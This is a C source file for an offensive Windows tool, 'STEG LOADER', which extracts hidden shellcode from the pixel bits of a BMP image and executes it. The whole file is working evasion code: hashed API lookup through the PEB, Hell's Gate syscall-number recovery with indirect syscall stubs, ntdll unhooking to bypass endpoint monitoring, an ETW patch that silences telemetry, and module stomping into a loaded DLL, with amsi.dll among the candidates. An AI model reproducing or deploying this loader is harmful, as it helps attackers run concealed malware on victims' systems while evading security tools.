// ============================================================
//  STEG LOADER — Extract shellcode from BMP + Ghost Execute
// ============================================================
//  The image looks like a normal picture.  The shellcode hides
//  in the least-significant bits of each pixel byte.
//
//  Execution engine: PEB walk → Hell's Gate → NTDLL unhook →
//                    ETW patch → Module stomp → Indirect syscall
//
//  Usage: steg_loader <image.bmp> [-x xor_key] [-b bits]
// ============================================================

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

// ---- BMP header structures ----
#pragma pack(push, 1)
typedef struct { unsigned short t; unsigned int sz; unsigned short r1,r2; unsigned int off; } BMFH;
typedef struct { unsigned int sz; int w,h; unsigned short pl,bpp; unsigned int comp,isz; int xpm,ypm; unsigned int cu,ci; } BMIH;
#pragma pack(pop)

// ---- Private LDR entry ----
typedef struct _GL_LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks, InMemoryOrderLinks, InInitializationOrderLinks;
    PVOID DllBase, EntryPoint; ULONG SizeOfImage;
    UNICODE_STRING FullDllName, BaseDllName;
} GL_LDR_ENTRY, *PGL_LDR_ENTRY;

// ---- NT prototypes ----
typedef NTSTATUS (NTAPI *fnNtAllocateVirtualMemory)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS (NTAPI *fnNtProtectVirtualMemory)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
typedef NTSTATUS (NTAPI *fnNtCreateThreadEx)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
typedef NTSTATUS (NTAPI *fnNtWaitForSingleObject)(HANDLE,BOOLEAN,PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *fnLdrLoadDll)(PWCHAR,ULONG,PUNICODE_STRING,HMODULE*);

// ---- Syscall table ----
typedef struct { DWORD hash; WORD ssn; PVOID stub; } GL_SC;
static GL_SC g_sc[4];
#define SC_A 0
#define SC_P 1
#define SC_C 2
#define SC_W 3

// ============================================================
//  djb2 hashing
// ============================================================
#define SEED 5381
static DWORD h_a(const char *s){DWORD h=SEED;int c;while((c=*s++)){if(c>='A'&&c<='Z')c+=32;h=((h<<5)+h)+(DWORD)c;}return h;}
static DWORD h_w(const WCHAR *s,USHORT bl){DWORD h=SEED;USHORT n=bl/sizeof(WCHAR);for(USHORT i=0;i<n;i++){WCHAR c=s[i];if(c>=L'A'&&c<=L'Z')c+=32;h=((h<<5)+h)+(DWORD)c;}return h;}

// ============================================================
//  PEB Walk
// ============================================================
static PVOID peb_find(DWORD hash){
    ULONG_PTR pa;
#ifdef _WIN64
    __asm__ volatile("movq %%gs:0x60,%0":"=r"(pa));
#else
    __asm__ volatile("movl %%fs:0x30,%0":"=r"(pa));
#endif
    PPEB peb=(PPEB)pa; PPEB_LDR_DATA ldr=peb->Ldr;
    PLIST_ENTRY head=&ldr->InMemoryOrderModuleList,cur=head->Flink;
    while(cur&&cur!=head){
        PGL_LDR_ENTRY e=(PGL_LDR_ENTRY)((BYTE*)cur-sizeof(LIST_ENTRY));
        if(e->BaseDllName.Buffer&&e->BaseDllName.Length)
            if(h_w(e->BaseDllName.Buffer,e->BaseDllName.Length)==hash)return e->DllBase;
        cur=cur->Flink;
    }
    return NULL;
}

// ============================================================
//  PE export parsing
// ============================================================
static PVOID pe_p(PVOID mod,DWORD hash){
    if(!mod)return NULL;
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)mod;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE)return NULL;
    PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)((BYTE*)mod+dos->e_lfanew);
    if(nt->Signature!=IMAGE_NT_SIGNATURE)return NULL;
    DWORD rva=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD sz=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if(!rva)return NULL;
    PIMAGE_EXPORT_DIRECTORY exp=(PIMAGE_EXPORT_DIRECTORY)((BYTE*)mod+rva);
    DWORD*nm=(DWORD*)((BYTE*)mod+exp->AddressOfNames);
    DWORD*fn=(DWORD*)((BYTE*)mod+exp->AddressOfFunctions);
    WORD*od=(WORD*)((BYTE*)mod+exp->AddressOfNameOrdinals);
    for(DWORD i=0;i<exp->NumberOfNames;i++){
        const char*n=(const char*)((BYTE*)mod+nm[i]);
        if(h_a(n)==hash){
            PVOID a=(PVOID)((BYTE*)mod+fn[od[i]]);
            if((ULONG_PTR)a>=(ULONG_PTR)exp&&(ULONG_PTR)a<(ULONG_PTR)exp+sz)return NULL;
            return a;
        }
    }
    return NULL;
}

// ============================================================
//  Hell's Gate + Halo's Gate
// ============================================================
static WORD extract_ssn(PVOID f){
    if(!f)return 0;BYTE*p=(BYTE*)f;
    if(p[0]==0x4C&&p[1]==0x8B&&p[2]==0xD1&&p[3]==0xB8&&p[6]==0x00&&p[7]==0x00)
        return(WORD)(p[4]|(p[5]<<8));
    for(int d=1;d<=500;d++){
        BYTE*u=p+(d*32);
        if(u[0]==0x4C&&u[1]==0x8B&&u[2]==0xD1&&u[3]==0xB8&&u[6]==0x00&&u[7]==0x00)
            return(WORD)((u[4]|(u[5]<<8))-d);
        BYTE*dn=p-(d*32);
        if(dn[0]==0x4C&&dn[1]==0x8B&&dn[2]==0xD1&&dn[3]==0xB8&&dn[6]==0x00&&dn[7]==0x00)
            return(WORD)((dn[4]|(dn[5]<<8))+d);
    }
    return 0;
}

// ============================================================
//  Build indirect syscall stubs
// ============================================================
static const BYTE STUB[]={0x4C,0x8B,0xD1,0xB8,0x00,0x00,0x00,0x00,0x0F,0x05,0xC3};

static BOOL build_stubs(PVOID ntdll){
    char a[]={'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    char b[]={'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
    char c[]={'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0};
    char d[]={'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0};
    g_sc[0].hash=h_a(a);g_sc[1].hash=h_a(b);g_sc[2].hash=h_a(c);g_sc[3].hash=h_a(d);
    PVOID p[4];
    for(int i=0;i<4;i++){p[i]=pe_p(ntdll,g_sc[i].hash);if(!p[i])return FALSE;
        g_sc[i].ssn=extract_ssn(p[i]);if(!g_sc[i].ssn)return FALSE;}
    printf("[+] SSNs  alloc=0x%03X  protect=0x%03X  create=0x%03X  wait=0x%03X\n",
        g_sc[0].ssn,g_sc[1].ssn,g_sc[2].ssn,g_sc[3].ssn);
    fnNtAllocateVirtualMemory NA=(fnNtAllocateVirtualMemory)p[0];
    fnNtProtectVirtualMemory NP=(fnNtProtectVirtualMemory)p[1];
    PVOID pg=NULL;SIZE_T ps=0x1000;
    if(NA((HANDLE)-1,&pg,0,&ps,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE)!=0||!pg)return FALSE;
    BYTE*cur=(BYTE*)pg;
    for(int i=0;i<4;i++){memcpy(cur,STUB,11);*(WORD*)(cur+4)=g_sc[i].ssn;g_sc[i].stub=cur;cur+=16;}
    PVOID pa=pg;SIZE_T pz=0x1000;ULONG old;
    if(NP((HANDLE)-1,&pa,&pz,PAGE_EXECUTE_READ,&old)!=0)return FALSE;
    return TRUE;
}

// ============================================================
//  NTDLL Unhooking
// ============================================================
static void unhook_ntdll(PVOID ntdll){
    char path[]={'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','n','t','d','l','l','.','d','l','l',0};
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE)return;
    DWORD fsz=GetFileSize(hf,NULL);
    BYTE*disk=(BYTE*)HeapAlloc(GetProcessHeap(),0,fsz);
    DWORD rd=0;ReadFile(hf,disk,fsz,&rd,NULL);CloseHandle(hf);
    PIMAGE_DOS_HEADER dd=(PIMAGE_DOS_HEADER)disk;
    PIMAGE_SECTION_HEADER sd=IMAGE_FIRST_SECTION((PIMAGE_NT_HEADERS)(disk+dd->e_lfanew));
    PIMAGE_DOS_HEADER dm=(PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nm=(PIMAGE_NT_HEADERS)((BYTE*)ntdll+dm->e_lfanew);
    PIMAGE_SECTION_HEADER sm=IMAGE_FIRST_SECTION(nm);
    fnNtProtectVirtualMemory NP=(fnNtProtectVirtualMemory)g_sc[SC_P].stub;
    for(int i=0;i<nm->FileHeader.NumberOfSections;i++){
        BYTE*n=sm[i].Name;
        if(n[0]=='.'&&n[1]=='t'&&n[2]=='e'&&n[3]=='x'&&n[4]=='t'){
            PVOID tgt=(BYTE*)ntdll+sm[i].VirtualAddress;SIZE_T tsz=sm[i].Misc.VirtualSize;
            BYTE*src=disk+sd[i].PointerToRawData;
            PVOID pa=tgt;SIZE_T pz=tsz;ULONG old;
            if(NP((HANDLE)-1,&pa,&pz,PAGE_READWRITE,&old)!=0)break;
            for(SIZE_T k=0;k<tsz;k++)((volatile BYTE*)tgt)[k]=src[k];
            pa=tgt;pz=tsz;NP((HANDLE)-1,&pa,&pz,old,&old);
            break;
        }
    }
    HeapFree(GetProcessHeap(),0,disk);
}

// ============================================================
//  ETW Patch
// ============================================================
static void patch_etw(PVOID ntdll){
    char name[]={'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
    PVOID etw=pe_p(ntdll,h_a(name));if(!etw)return;
    BYTE patch[]={0x33,0xC0,0xC3};
    PVOID addr=etw;SIZE_T size=sizeof(patch);ULONG old;
    fnNtProtectVirtualMemory NP=(fnNtProtectVirtualMemory)g_sc[SC_P].stub;
    if(NP((HANDLE)-1,&addr,&size,PAGE_READWRITE,&old)==0){
        memcpy(etw,patch,sizeof(patch));
        addr=etw;size=sizeof(patch);NP((HANDLE)-1,&addr,&size,old,&old);
        printf("[+] ETW patched @ %p\n",etw);
    }
}

// ============================================================
//  Module Stomping
// ============================================================
static HMODULE try_dll(fnLdrLoadDll L,WCHAR*name){
    UNICODE_STRING u;u.Buffer=name;u.Length=(USHORT)(wcslen(name)*sizeof(WCHAR));
    u.MaximumLength=u.Length+sizeof(WCHAR);HMODULE h=NULL;
    if(L(NULL,0,&u,&h)==0&&h)return h;return NULL;
}

static PVOID stomp(PVOID ntdll,unsigned char*sc,size_t sc_len){
    char sl[]={'L','d','r','L','o','a','d','D','l','l',0};
    fnLdrLoadDll L=(fnLdrLoadDll)pe_p(ntdll,h_a(sl));
    if(!L){printf("[-] LdrLoadDll missing\n");return NULL;}
    WCHAR*cands[]={
        (WCHAR[]){'m','s','h','t','m','l','.','d','l','l',0},
        (WCHAR[]){'d','3','d','1','1','.','d','l','l',0},
        (WCHAR[]){'u','r','l','m','o','n','.','d','l','l',0},
        (WCHAR[]){'d','b','g','h','e','l','p','.','d','l','l',0},
        (WCHAR[]){'w','i','n','i','n','e','t','.','d','l','l',0},
        (WCHAR[]){'x','p','s','s','v','c','s','.','d','l','l',0},
        (WCHAR[]){'a','m','s','i','.','d','l','l',0},NULL
    };
    HMODULE hm=NULL;PVOID text=NULL;DWORD tsz=0;
    for(int c=0;cands[c];c++){
        hm=try_dll(L,cands[c]);if(!hm)continue;
        PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)hm;
        PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)((BYTE*)hm+dos->e_lfanew);
        PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);
        for(int i=0;i<nt->FileHeader.NumberOfSections;i++){
            if((sec[i].Characteristics&IMAGE_SCN_MEM_EXECUTE)&&sec[i].Misc.VirtualSize>=sc_len){
                text=(BYTE*)hm+sec[i].VirtualAddress;tsz=sec[i].Misc.VirtualSize;break;
            }
        }
        if(text){printf("[+] Stomp host @ %p\n",(PVOID)hm);break;}
    }
    if(!text){
        fnNtAllocateVirtualMemory NA=(fnNtAllocateVirtualMemory)g_sc[SC_A].stub;
        fnNtProtectVirtualMemory NP=(fnNtProtectVirtualMemory)g_sc[SC_P].stub;
        PVOID mem=NULL;SIZE_T sz=sc_len;
        if(NA((HANDLE)-1,&mem,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE)!=0||!mem)return NULL;
        memcpy(mem,sc,sc_len);
        PVOID pa=mem;SIZE_T ps=sc_len;ULONG old;
        NP((HANDLE)-1,&pa,&ps,PAGE_EXECUTE_READ,&old);
        return mem;
    }
    printf("[+] .text @ %p  (%u bytes)\n",text,(unsigned)tsz);
    fnNtProtectVirtualMemory NP=(fnNtProtectVirtualMemory)g_sc[SC_P].stub;
    PVOID addr=text;SIZE_T size=sc_len;ULONG old;
    if(NP((HANDLE)-1,&addr,&size,PAGE_READWRITE,&old)!=0)return NULL;
    memcpy(text,sc,sc_len);
    addr=text;size=sc_len;NP((HANDLE)-1,&addr,&size,PAGE_EXECUTE_READ,&old);
    return text;
}

// ============================================================
//  Execute via NtCreateThreadEx
// ============================================================
static int execute(PVOID entry){
    fnNtCreateThreadEx NC=(fnNtCreateThreadEx)g_sc[SC_C].stub;
    fnNtWaitForSingleObject NW=(fnNtWaitForSingleObject)g_sc[SC_W].stub;
    HANDLE th=NULL;
    if(NC(&th,0x1FFFFF,NULL,(HANDLE)-1,entry,NULL,0,0,0,0,NULL)!=0||!th)return -1;
    NW(th,FALSE,NULL);
    printf("\n[+] Done.\n");
    return 0;
}

// ============================================================
//  BMP Steganography — extract shellcode from pixel LSBs
// ============================================================
static void set_bit(unsigned char *data, int pos, int val) {
    int bi = pos / 8, bo = 7 - (pos % 8);
    if (val) data[bi] |= (1 << bo);
    else     data[bi] &= ~(1 << bo);
}

static unsigned char *extract_from_bmp(const char *path, int bpc, size_t *out_len) {
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                            NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    DWORD fsz = GetFileSize(hf, NULL);
    BYTE *bmp = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fsz);
    DWORD rd = 0;
    ReadFile(hf, bmp, fsz, &rd, NULL);
    CloseHandle(hf);

    BMFH *fh = (BMFH*)bmp;
    BMIH *ih = (BMIH*)(bmp + sizeof(BMFH));

    if (fh->t != 0x4D42 || ih->bpp != 24 || ih->comp != 0) {
        HeapFree(GetProcessHeap(), 0, bmp);
        return NULL;
    }

    BYTE *pixels = bmp + fh->off;
    long pixel_bytes = fsz - fh->off;
    unsigned char mask = (1 << bpc) - 1;

    // First extract 4 bytes (length header)
    unsigned char hdr[4] = {0};
    int data_bit = 0;

    for (long i = 0; i < pixel_bytes && data_bit < 32; i++) {
        for (int b = bpc - 1; b >= 0; b--) {
            if (data_bit < 32) {
                set_bit(hdr, data_bit, (pixels[i] >> b) & 1);
                data_bit++;
            }
        }
    }

    size_t sc_len = ((size_t)hdr[0] << 24) | ((size_t)hdr[1] << 16) |
                    ((size_t)hdr[2] << 8)  |  (size_t)hdr[3];

    if (sc_len == 0 || sc_len > 50000000) {
        HeapFree(GetProcessHeap(), 0, bmp);
        return NULL;
    }

    // Extract full payload
    size_t total = 4 + sc_len;
    unsigned char *data = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, total);
    data_bit = 0;
    long total_bits = (long)total * 8;

    for (long i = 0; i < pixel_bytes && data_bit < total_bits; i++) {
        for (int b = bpc - 1; b >= 0; b--) {
            if (data_bit < total_bits) {
                set_bit(data, data_bit, (pixels[i] >> b) & 1);
                data_bit++;
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, bmp);

    // Skip 4-byte header, return shellcode
    unsigned char *sc = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, sc_len);
    memcpy(sc, data + 4, sc_len);
    HeapFree(GetProcessHeap(), 0, data);

    *out_len = sc_len;
    return sc;
}

// ============================================================
//  Main
// ============================================================
int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("STEG LOADER — Shellcode from image\n\n");
        printf("Usage: %s <image.bmp> [-x xor_key] [-b bits]\n", argv[0]);
        printf("\n  -x    XOR decode key (0-255)\n");
        printf("  -b    Bits per channel (default 2)\n");
        return 1;
    }

    const char *bmp_path = NULL;
    int xor_key = -1;
    int bpc = 2;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-x") == 0 && i+1 < argc) xor_key = atoi(argv[++i]);
        else if (strcmp(argv[i], "-b") == 0 && i+1 < argc) bpc = atoi(argv[++i]);
        else bmp_path = argv[i];
    }

    printf("\033[31m#Made By Worry.\033[0m\n\n");

    // 1. Extract shellcode from image
    printf("[+] Extracting from image...\n");
    size_t sc_len = 0;
    unsigned char *sc = extract_from_bmp(bmp_path, bpc, &sc_len);
    if (!sc) {
        printf("[-] Extraction failed: %s\n", bmp_path);
        return 1;
    }
    printf("[+] Extracted %zu bytes from pixels\n", sc_len);

    // XOR decode
    if (xor_key >= 0 && xor_key <= 255) {
        for (size_t i = 0; i < sc_len; i++) sc[i] ^= (unsigned char)xor_key;
    }

    // 2. Ghost engine
    char nt[] = {'n','t','d','l','l','.','d','l','l',0};
    PVOID ntdll = peb_find(h_a(nt));
    if (!ntdll) { printf("[-] NTDLL not in PEB\n"); return 1; }
    printf("[+] NTDLL @ %p\n", ntdll);

    if (!build_stubs(ntdll)) return 1;
    unhook_ntdll(ntdll);
    patch_etw(ntdll);

    // 3. Stomp + Execute
    PVOID entry = stomp(ntdll, sc, sc_len);
    SecureZeroMemory(sc, sc_len);
    HeapFree(GetProcessHeap(), 0, sc);
    if (!entry) return 1;

    return execute(entry);
}
